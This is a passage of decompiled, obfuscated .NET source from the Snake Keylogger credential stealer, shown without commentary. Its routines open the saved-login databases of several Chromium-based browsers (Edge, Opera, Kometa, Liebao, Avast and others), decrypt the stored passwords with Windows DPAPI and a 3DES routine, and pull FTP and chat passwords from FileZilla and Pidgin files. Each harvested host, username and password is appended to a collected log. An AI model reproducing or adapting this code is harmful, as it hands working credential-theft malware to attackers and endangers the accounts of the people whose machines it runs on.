        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Amigo\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Ł\u0040Մٚі()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Kometa\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Kometa\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ʓ\uFFFDҢ\uFFFDִ()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Xpom\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Xpom\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void ƜZջŚӚ()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Elements Browser\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Elements\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \u003BҟٗأO()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
      try
      {
        \u07FB\uD9C5\uDF63ņٚ ņٚ = new \u07FB\uD9C5\uDF63ņٚ(path);
        ņٚ.A2ݝݶ\uFFFD("logins");
        if (!File.Exists(path))
          return;
        int num = checked (ņٚ.\uFFFD皍ک\u2964̲() - 1);
        int ˤթᔖʪ꾯 = 0;
        while (ˤթᔖʪ꾯 <= num)
        {
          string str1 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "origin_url");
          string Left = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "username_value");
          string str2 = ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value");
          if (ک\uFFFD鈟ٷΩ.\uFFFD\uD9D8\uDF1A\u003Bܣ(str2))
          {
            byte[] numArray = ک\uFFFD鈟ٷΩ.뜸\uFFFD̆ٚˤ(Directory.GetParent(path).Parent.FullName);
            if (numArray != null)
              str2 = ک\uFFFD鈟ٷΩ.Ȩޗ\uFFFDzƜ(Encoding.Default.GetBytes(str2), numArray);
          }
          else
            str2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD(Encoding.Default.GetBytes(ņٚ.ӥ븤ʭ\u05C3뜸(ˤթᔖʪ꾯, "password_value")));
          if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Edge Chromium\r\nHost: " + str1 + "\r\nUSR: " + Left + "\r\nPSWD: " + str2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++ˤթᔖʪ꾯; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [DllImport("Crypt32.dll", EntryPoint = "CryptUnprotectData", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool ɢ\uDB77\uDEEA\uFFFḎ(
      ref ک\uFFFD鈟ٷΩ.DATA_BLOB _param0,
      string _param1,
      ref ک\uFFFD鈟ٷΩ.DATA_BLOB _param2,
      IntPtr _param3,
      ref ک\uFFFD鈟ٷΩ.CRYPTPROTECT_PROMPTSTRUCT _param4,
      int _param5,
      ref ک\uFFFD鈟ٷΩ.DATA_BLOB _param6);

    public static string ٵ̲\u005Ei\uFFFD(byte[] _param0)
    {
      ک\uFFFD鈟ٷΩ.DATA_BLOB dataBlob1 = new ک\uFFFD鈟ٷΩ.DATA_BLOB();
      ک\uFFFD鈟ٷΩ.DATA_BLOB dataBlob2 = new ک\uFFFD鈟ٷΩ.DATA_BLOB();
      GCHandle gcHandle = GCHandle.Alloc((object) _param0, GCHandleType.Pinned);
      dataBlob1.pbData = gcHandle.AddrOfPinnedObject();
      dataBlob1.cbData = _param0.Length;
      gcHandle.Free();
      ref ک\uFFFD鈟ٷΩ.DATA_BLOB local1 = ref dataBlob1;
      ک\uFFFD鈟ٷΩ.DATA_BLOB dataBlob3 = new ک\uFFFD鈟ٷΩ.DATA_BLOB();
      ref ک\uFFFD鈟ٷΩ.DATA_BLOB local2 = ref dataBlob3;
      IntPtr num = new IntPtr();
      ک\uFFFD鈟ٷΩ.CRYPTPROTECT_PROMPTSTRUCT cryptprotectPromptstruct = new ک\uFFFD鈟ٷΩ.CRYPTPROTECT_PROMPTSTRUCT();
      ref ک\uFFFD鈟ٷΩ.CRYPTPROTECT_PROMPTSTRUCT local3 = ref cryptprotectPromptstruct;
      ref ک\uFFFD鈟ٷΩ.DATA_BLOB local4 = ref dataBlob2;
      ک\uFFFD鈟ٷΩ.ɢ\uDB77\uDEEA\uFFFḎ(ref local1, (string) null, ref local2, num, ref local3, 0, ref local4);
      byte[] numArray = new byte[checked (dataBlob2.cbData + 1)];
      Marshal.Copy(dataBlob2.pbData, numArray, 0, dataBlob2.cbData);
      string str = Encoding.Default.GetString(numArray);
      return str.Substring(0, checked (str.Length - 1));
    }

    public static void \uFFFDհ\u05C9\uFFFDЦ()
    {
      if (File.Exists(ک\uFFFD鈟ٷΩ.OЮ\uDB77\uDDCFΠ + Strings.StrReverse("ataD nigoL\\elbatS arepO\\erawtfoS arepO\\")))
        ک\uFFFD鈟ٷΩ.OЮ\uDB77\uDDCFΠ += Strings.StrReverse("ataD nigoL\\elbatS arepO\\erawtfoS arepO\\");
      else if (File.Exists(ک\uFFFD鈟ٷΩ.OЮ\uDB77\uDDCFΠ + Strings.StrReverse("tad.dnaw\\eliforp\\arepO\\arepO\\")))
        ک\uFFFD鈟ٷΩ.OЮ\uDB77\uDDCFΠ += Strings.StrReverse("tad.dnaw\\eliforp\\arepO\\arepO\\");
      try
      {
        object obj1 = (object) new \u07FB\uD9C5\uDF63ņٚ(ک\uFFFD鈟ٷΩ.OЮ\uDB77\uDDCFΠ);
        NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(obj1), (Type) null, "ReadTable", new object[1]
        {
          (object) Strings.StrReverse("snigol")
        }, (string[]) null, (Type[]) null, (bool[]) null, true);
        if (!File.Exists(ک\uFFFD鈟ٷΩ.OЮ\uDB77\uDDCFΠ))
          return;
        int num1 = 0;
        int integer = Conversions.ToInteger(RuntimeHelpers.GetObjectValue(Operators.SubtractObject(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(obj1), (Type) null, "GetRowCount", new object[0], (string[]) null, (Type[]) null, (bool[]) null)), (object) 1)));
        int num2 = num1;
        int num3 = integer;
        int num4 = num2;
        while (num4 <= num3)
        {
          object objectValue1 = RuntimeHelpers.GetObjectValue(obj1);
          Type Type1 = (Type) null;
          string MemberName1 = "GetValue";
          object[] objArray1 = new object[2]
          {
            (object) num4,
            (object) Strings.StrReverse("lru_nigiro")
          };
          object[] Arguments1 = objArray1;
          string[] ArgumentNames1 = (string[]) null;
          Type[] TypeArguments1 = (Type[]) null;
          bool[] CopyBack1 = new bool[2]{ true, false };
          object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue1), Type1, MemberName1, Arguments1, ArgumentNames1, TypeArguments1, CopyBack1));
          if (CopyBack1[0])
            num4 = Conversions.ToInteger(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray1[0])), typeof (int)));
          string str1 = Conversions.ToString(RuntimeHelpers.GetObjectValue(objectValue2));
          object objectValue3 = RuntimeHelpers.GetObjectValue(obj1);
          Type Type2 = (Type) null;
          string MemberName2 = "GetValue";
          object[] objArray2 = new object[2]
          {
            (object) num4,
            (object) Strings.StrReverse("eulav_emanresu")
          };
          object[] Arguments2 = objArray2;
          string[] ArgumentNames2 = (string[]) null;
          Type[] TypeArguments2 = (Type[]) null;
          bool[] CopyBack2 = new bool[2]{ true, false };
          object objectValue4 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue3), Type2, MemberName2, Arguments2, ArgumentNames2, TypeArguments2, CopyBack2));
          if (CopyBack2[0])
            num4 = Conversions.ToInteger(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray2[0])), typeof (int)));
          string Left1 = Conversions.ToString(RuntimeHelpers.GetObjectValue(objectValue4));
          object obj2 = (object) Encoding.Default;
          Type Type3 = (Type) null;
          string MemberName3 = "GetBytes";
          object[] objArray3 = new object[1];
          object[] objArray4 = objArray3;
          int index1 = 0;
          object objectValue5 = RuntimeHelpers.GetObjectValue(obj1);
          object objectValue6 = RuntimeHelpers.GetObjectValue(objectValue5);
          Type Type4 = (Type) null;
          string MemberName4 = "GetValue";
          object[] objArray5 = new object[2]
          {
            (object) num4,
            null
          };
          object[] objArray6 = objArray5;
          int index2 = 1;
          string str2 = Strings.StrReverse("eulav_drowssap");
          objArray6[index2] = (object) str2;
          object[] objArray7 = objArray5;
          object[] Arguments3 = objArray7;
          string[] ArgumentNames3 = (string[]) null;
          Type[] TypeArguments3 = (Type[]) null;
          bool[] CopyBack3 = new bool[2]{ true, false };
          object objectValue7 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue6), Type4, MemberName4, Arguments3, ArgumentNames3, TypeArguments3, CopyBack3));
          if (CopyBack3[0])
            num4 = Conversions.ToInteger(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray7[0])), typeof (int)));
          objArray4[index1] = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue7));
          object[] objArray8 = objArray3;
          object[] Arguments4 = objArray8;
          string[] ArgumentNames4 = (string[]) null;
          Type[] TypeArguments4 = (Type[]) null;
          bool[] CopyBack4 = new bool[1]{ true };
          object objectValue8 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(obj2), Type3, MemberName3, Arguments4, ArgumentNames4, TypeArguments4, CopyBack4));
          if (CopyBack4[0])
            NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(objectValue5), (Type) null, "GetValue", new object[3]
            {
              (object) num4,
              (object) str2,
              RuntimeHelpers.GetObjectValue(objArray8[0])
            }, (string[]) null, (Type[]) null, true, false);
          string Left2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD((byte[]) objectValue8);
          if (Operators.CompareString(Left1, "", false) != 0 & Operators.CompareString(Left2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Opera\r\nHost: " + str1 + "\r\nUSR: " + Left1 + "\r\nPSWD: " + Left2 + "\r\n---------------------------------\r\n ";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++num4; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string \u06E8\uDA3B\uDC2CUľ(string _param0)
    {
      string str1 = "abcdefghijklmnopqrstuvwxyz1234567890_-.~!@#$%^&*()[{]}\\|';:,<>/?+=";
      string str2 = "";
      string str3 = _param0;
      int index = 0;
      while (index < str3.Length)
      {
        string str4 = Conversions.ToString(str3[index]);
        if (str1.Contains(str4.ToLower()))
          str2 += str4;
        checked { ++index; }
      }
      return str2;
    }

    public static object \u07B9թ̆ϒҚ(byte[] ή̆ޗ؜恁, byte[] _param1)
    {
      object obj;
      try
      {
        MD5CryptoServiceProvider cryptoServiceProvider1 = new MD5CryptoServiceProvider();
        cryptoServiceProvider1.Initialize();
        byte[] numArray1 = new byte[checked (ک\uFFFD鈟ٷΩ.і\u0097盀\uFFFDε.Length + (ή̆ޗ؜恁.Length - 1) + 1)];
        Array.Copy((Array) ک\uFFFD鈟ٷΩ.і\u0097盀\uFFFDε, (Array) numArray1, ک\uFFFD鈟ٷΩ.і\u0097盀\uFFFDε.Length);
        Array.Copy((Array) ή̆ޗ؜恁, 0, (Array) numArray1, ک\uFFFD鈟ٷΩ.і\u0097盀\uFFFDε.Length, ή̆ޗ؜恁.Length);
        byte[] hash1 = cryptoServiceProvider1.ComputeHash(numArray1);
        byte[] numArray2 = new byte[checked (hash1.Length + ک\uFFFD鈟ٷΩ.і\u0097盀\uFFFDε.Length + (ή̆ޗ؜恁.Length - 1) + 1)];
        Array.Copy((Array) hash1, (Array) numArray2, hash1.Length);
        Array.Copy((Array) ک\uFFFD鈟ٷΩ.і\u0097盀\uFFFDε, 0, (Array) numArray2, hash1.Length, ک\uFFFD鈟ٷΩ.і\u0097盀\uFFFDε.Length);
        Array.Copy((Array) ή̆ޗ؜恁, 0, (Array) numArray2, checked (hash1.Length + ک\uFFFD鈟ٷΩ.і\u0097盀\uFFFDε.Length), ή̆ޗ؜恁.Length);
        byte[] hash2 = cryptoServiceProvider1.ComputeHash(numArray2);
        TripleDESCryptoServiceProvider cryptoServiceProvider2 = new TripleDESCryptoServiceProvider();
        cryptoServiceProvider2.Mode = CipherMode.CBC;
        cryptoServiceProvider2.Padding = PaddingMode.None;
        byte[] destinationArray1 = new byte[24];
        byte[] destinationArray2 = new byte[8];
        Array.Copy((Array) hash1, (Array) destinationArray1, hash1.Length);
        Array.Copy((Array) hash2, 0, (Array) destinationArray1, hash1.Length, 8);
        Array.Copy((Array) hash2, 8, (Array) destinationArray2, 0, 8);
        cryptoServiceProvider2.Key = destinationArray1;
        cryptoServiceProvider2.IV = destinationArray2;
        obj = (object) Encoding.Unicode.GetString(cryptoServiceProvider2.CreateDecryptor().TransformFinalBlock(_param1, 0, _param1.Length));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) "";
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public static string \u02F3ҟ\uFFFDՄ\uFFFD()
    {
      string filename = Interaction.Environ("APPDATA") + "\\FileZilla\\recentservers.xml";
      try
      {
        XmlDocument xmlDocument = new XmlDocument();
        xmlDocument.Load(filename);
        XmlNodeList elementsByTagName1 = xmlDocument.GetElementsByTagName("Host");
        XmlNodeList elementsByTagName2 = xmlDocument.GetElementsByTagName("User");
        XmlNodeList elementsByTagName3 = xmlDocument.GetElementsByTagName("Pass");
        XmlNodeList elementsByTagName4 = xmlDocument.GetElementsByTagName("Port");
        string str1 = "";
        string str2 = "";
        string str3 = "";
        string str4 = "";
        try
        {
          foreach (XmlElement xmlElement in elementsByTagName1)
            str3 = xmlElement.InnerText;
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        try
        {
          foreach (XmlElement xmlElement in elementsByTagName2)
            str2 = xmlElement.InnerText;
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        try
        {
          foreach (XmlElement xmlElement in elementsByTagName3)
            str1 = xmlElement.InnerText;
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        try
        {
          foreach (XmlElement xmlElement in elementsByTagName4)
            str4 = xmlElement.InnerText;
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        string str5 = Encoding.ASCII.GetString(Convert.FromBase64String(str1.ToString()));
        string str6 = "\r\n-------- Snake Keylogger --------\r\nFound From: FileZilla\r\n" + ("Host: " + str3 + "\r\nUsername: " + str2 + "\r\nPassword: " + str5 + "\r\nPort: " + str4 + "\r\n---------------------------------\r\n");
        \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str6;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      string str;
      return str;
    }

    public static void Ю\uFFFD\u02E8\uFFFD\u07FB()
    {
      XmlDocument xmlDocument = new XmlDocument();
      string str = Interaction.Environ("AppData") + "\\.purple\\accounts.xml";
      if (!File.Exists(str))
        return;
      try
      {
        xmlDocument.Load(str);
        XmlNodeList elementsByTagName1 = xmlDocument.GetElementsByTagName("protocol");
        XmlNodeList elementsByTagName2 = xmlDocument.GetElementsByTagName("name");
        XmlNodeList elementsByTagName3 = xmlDocument.GetElementsByTagName("password");
        int num1 = 0;
        int num2 = checked (elementsByTagName1.Count - 1);
        int num3 = num1;
        int num4 = num2;
        int i = num3;
        while (i <= num4)
        {
          object obj = (object) ("\r\n-------- Snake Keylogger --------\r\nFound From: Pidgin\r\nProtocol: " + elementsByTagName1[i].InnerText + "\r\nUsername: " + elementsByTagName2[i].InnerText + "\r\nPassword: " + elementsByTagName3[i].InnerText + "\r\n---------------------------------\r\n");
          \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 = Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.AddObject((object) \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9, RuntimeHelpers.GetObjectValue(obj))));
          checked { ++i; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void 恁ޤ\u00AB\uFFFDӛ()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Liebao7\\User Data\\Default\\EncryptedStorage";
      try
      {
        object obj1 = (object) new \u07FB\uD9C5\uDF63ņٚ(path);
        NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(obj1), (Type) null, "ReadTable", new object[1]
        {
          (object) "entries"
        }, (string[]) null, (Type[]) null, (bool[]) null, true);
        if (!File.Exists(path))
          return;
        int num1 = 0;
        int integer = Conversions.ToInteger(RuntimeHelpers.GetObjectValue(Operators.SubtractObject(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(obj1), (Type) null, "GetRowCount", new object[0], (string[]) null, (Type[]) null, (bool[]) null)), (object) 1)));
        int num2 = num1;
        int num3 = integer;
        int num4 = num2;
        while (num4 <= num3)
        {
          object objectValue1 = RuntimeHelpers.GetObjectValue(obj1);
          Type Type1 = (Type) null;
          string MemberName1 = "GetValue";
          object[] objArray1 = new object[2]
          {
            (object) num4,
            (object) "str3"
          };
          object[] Arguments1 = objArray1;
          string[] ArgumentNames1 = (string[]) null;
          Type[] TypeArguments1 = (Type[]) null;
          bool[] CopyBack1 = new bool[2]{ true, false };
          object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue1), Type1, MemberName1, Arguments1, ArgumentNames1, TypeArguments1, CopyBack1));
          if (CopyBack1[0])
            num4 = Conversions.ToInteger(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray1[0])), typeof (int)));
          string str1 = Conversions.ToString(RuntimeHelpers.GetObjectValue(objectValue2));
          object objectValue3 = RuntimeHelpers.GetObjectValue(obj1);
          Type Type2 = (Type) null;
          string MemberName2 = "GetValue";
          object[] objArray2 = new object[2]
          {
            (object) num4,
            (object) "str2"
          };
          object[] Arguments2 = objArray2;
          string[] ArgumentNames2 = (string[]) null;
          Type[] TypeArguments2 = (Type[]) null;
          bool[] CopyBack2 = new bool[2]{ true, false };
          object objectValue4 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue3), Type2, MemberName2, Arguments2, ArgumentNames2, TypeArguments2, CopyBack2));
          if (CopyBack2[0])
            num4 = Conversions.ToInteger(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray2[0])), typeof (int)));
          string Left1 = Conversions.ToString(RuntimeHelpers.GetObjectValue(objectValue4));
          object obj2 = (object) Encoding.Default;
          Type Type3 = (Type) null;
          string MemberName3 = "GetBytes";
          object[] objArray3 = new object[1];
          object[] objArray4 = objArray3;
          int index1 = 0;
          object objectValue5 = RuntimeHelpers.GetObjectValue(obj1);
          object objectValue6 = RuntimeHelpers.GetObjectValue(objectValue5);
          Type Type4 = (Type) null;
          string MemberName4 = "GetValue";
          object[] objArray5 = new object[2]
          {
            (object) num4,
            null
          };
          object[] objArray6 = objArray5;
          int index2 = 1;
          string str2 = "blob0";
          objArray6[index2] = (object) str2;
          object[] objArray7 = objArray5;
          object[] Arguments3 = objArray7;
          string[] ArgumentNames3 = (string[]) null;
          Type[] TypeArguments3 = (Type[]) null;
          bool[] CopyBack3 = new bool[2]{ true, false };
          object objectValue7 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue6), Type4, MemberName4, Arguments3, ArgumentNames3, TypeArguments3, CopyBack3));
          if (CopyBack3[0])
            num4 = Conversions.ToInteger(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray7[0])), typeof (int)));
          objArray4[index1] = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue7));
          object[] objArray8 = objArray3;
          object[] Arguments4 = objArray8;
          string[] ArgumentNames4 = (string[]) null;
          Type[] TypeArguments4 = (Type[]) null;
          bool[] CopyBack4 = new bool[1]{ true };
          object objectValue8 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(obj2), Type3, MemberName3, Arguments4, ArgumentNames4, TypeArguments4, CopyBack4));
          if (CopyBack4[0])
            NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(objectValue5), (Type) null, "GetValue", new object[3]
            {
              (object) num4,
              (object) str2,
              RuntimeHelpers.GetObjectValue(objArray8[0])
            }, (string[]) null, (Type[]) null, true, false);
          string Left2 = ک\uFFFD鈟ٷΩ.ٵ̲\u005Ei\uFFFD((byte[]) objectValue8);
          if (Operators.CompareString(Left1, "", false) != 0 & Operators.CompareString(Left2, "", false) != 0)
          {
            string str3 = "\r\n-------- Snake Keylogger --------\r\nFound From: Liebao\r\nHost: " + str1 + "\r\nUsername: " + Left1 + "\r\nPassword: " + Left2 + "\r\n---------------------------------\r\n";
            \uFFFDk\uFFFDkٷ.\uDB0A\uDE26\u003BŚ\uF0B9 += str3;
          }
          checked { ++num4; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void 퓜ϒٵ\uFFFDا()
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\AVAST Software\\Browser\\User Data\\Default\\Login Data";
      try
      {
        object obj1 = (object) new \u07FB\uD9C5\uDF63ņٚ(path);
        NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(obj1), (Type) null, "ReadTable", new object[1]
        {
          (object) Strings.StrReverse("snigol")
        }, (string[]) null, (Type[]) null, (bool[]) null, true);
